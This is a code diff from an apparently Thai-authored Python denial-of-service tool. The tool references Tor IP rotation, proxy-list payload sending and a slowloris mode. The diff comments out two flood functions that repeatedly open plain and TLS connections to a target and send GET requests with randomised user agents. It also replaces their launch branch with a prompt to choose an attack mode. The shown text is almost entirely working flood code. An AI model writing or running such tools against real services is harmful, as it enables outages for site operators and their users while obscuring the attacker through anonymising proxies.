@@ -248,30 +248,30 @@ def change_tor_ip(control_port=9051):
 
 
 sockets_list = []
-def main_attack():
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((target_ip, port_target))
+# def main_attack():
+#     while True:
+#         try:
+#             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#             s.settimeout(2)
+#             s.connect((target_ip, port_target))
 
-            if args.random_agent:
-                user_agent = random.choice(user_agents)
-            else:
-                user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
+#             if args.random_agent:
+#                 user_agent = random.choice(user_agents)
+#             else:
+#                 user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
 
-            request = (
-                f"GET / HTTP/1.1\r\n"
-                f"Host: {target_ip}\r\n"
-                f"User-Agent: {user_agent}\r\n"
-                f"Connection: close\r\n\r\n"
-            )
+#             request = (
+#                 f"GET / HTTP/1.1\r\n"
+#                 f"Host: {target_ip}\r\n"
+#                 f"User-Agent: {user_agent}\r\n"
+#                 f"Connection: close\r\n\r\n"
+#             )
 
-            s.send(request.encode())
-            print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Packet sent: user-agent > {user_agent}{styles['reset']}")
-            s.close()
-        except Exception as e:
-            print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")
+#             s.send(request.encode())
+#             print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Packet sent: user-agent > {user_agent}{styles['reset']}")
+#             s.close()
+#         except Exception as e:
+#             print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")
 
 sockets = []
 
@@ -588,35 +588,35 @@ def send_payload_with_proxy_list(proxy_ip_port=None):
                 pass
             time.sleep(1)
 
-def https_attack():
-    try:
-        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        raw_sock.settimeout(3)
-        raw_sock.connect((target_ip, port_target))
+# def https_attack():
+#     try:
+#         raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#         raw_sock.settimeout(3)
+#         raw_sock.connect((target_ip, port_target))
 
-        context = ssl.create_default_context()
-        s = context.wrap_socket(raw_sock, server_hostname=target_ip)
+#         context = ssl.create_default_context()
+#         s = context.wrap_socket(raw_sock, server_hostname=target_ip)
 
-        # เลือก user-agent แบบสุ่ม
-        if args.random_agent:
-                user_agent = random.choice(user_agents)
-        else:
-            user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
+#         # เลือก user-agent แบบสุ่ม
+#         if args.random_agent:
+#                 user_agent = random.choice(user_agents)
+#         else:
+#             user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64)"
 
-        # สร้าง HTTPS request
-        request = (
-            f"GET / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
-            f"User-Agent: {user_agent}\r\n"
-            f"Connection: close\r\n\r\n"
-        )
+#         # สร้าง HTTPS request
+#         request = (
+#             f"GET / HTTP/1.1\r\n"
+#             f"Host: {target_ip}\r\n"
+#             f"User-Agent: {user_agent}\r\n"
+#             f"Connection: close\r\n\r\n"
+#         )
 
-        s.send(request.encode())
-        print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sent HTTPS request with UA: {user_agent}{styles['reset']}")
-        s.close()
+#         s.send(request.encode())
+#         print(f"[{back_colors['green']}+{back_colors['reset']}] {styles['bright']}Sent HTTPS request with UA: {user_agent}{styles['reset']}")
+#         s.close()
 
-    except Exception as e:
-        print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")
+#     except Exception as e:
+#         print(f"[{back_colors['red']}!{back_colors['reset']}] {styles['bright']}Error: {e}{styles['reset']}")
 
 # Start attack
 # Check Help
@@ -764,12 +764,10 @@ if check_target(target_ip, port_target):
             for t in threads:
                 t.join()
 
-        # Https Attak
-        elif args.port == 443:
-            t = threading.Thread(target=https_attack, daemon=True)
-
         else:
-            t = threading.Thread(target=main_attack, daemon=True)
+            print(f"[{back_colors['red']}INFO{back_colors['reset']}] Please select a {styles['bright']}mode to attack{styles['reset']} (slowloris,payload or -h for help)")
+            exit()
+
         t.start()
     while True:
         time.sleep(1)
